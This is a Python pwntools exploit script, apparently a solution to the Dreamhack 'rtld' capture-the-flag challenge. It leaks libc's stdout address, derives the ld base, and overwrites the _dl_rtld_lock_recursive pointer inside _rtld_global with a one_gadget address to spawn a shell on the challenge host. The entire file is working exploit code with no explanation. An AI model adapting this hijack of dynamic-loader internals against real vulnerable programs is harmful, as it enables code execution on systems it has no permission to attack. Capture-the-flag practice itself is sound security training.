#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./rtld_patched', checksec=False)

libc = ELF("./libc-2.23.so", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

gs = """
b *main
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)



def start():
    if args.GDB:
        return gdb.debug(elf.path, env={"LD_PRELOAD": libc.path},gdbscript=gs)
    elif args.REMOTE:
        return remote('host3.dreamhack.games', 10866)
    else:
        return process(elf.path, env={"LD_LIBRARY_PATH": libc.path})

io = start()
io.recvuntil(b'stdout: ')
libc.address = int(io.recv(14), 16) - libc.sym['_IO_2_1_stdout_']
ld.address = libc.address + 0x3ca000
success(f"libc @ {hex(libc.address)}")
success(f"ld @ {hex(ld.address)}")

_rtld_global = ld.sym['_rtld_global']
_dl_rtld_lock_recursive = _rtld_global + 0xf08
one_gadget = libc.address + 0xf1247

sla(b'addr: ', str(_dl_rtld_lock_recursive).encode())
sla(b'value: ', str(one_gadget).encode())

io.interactive()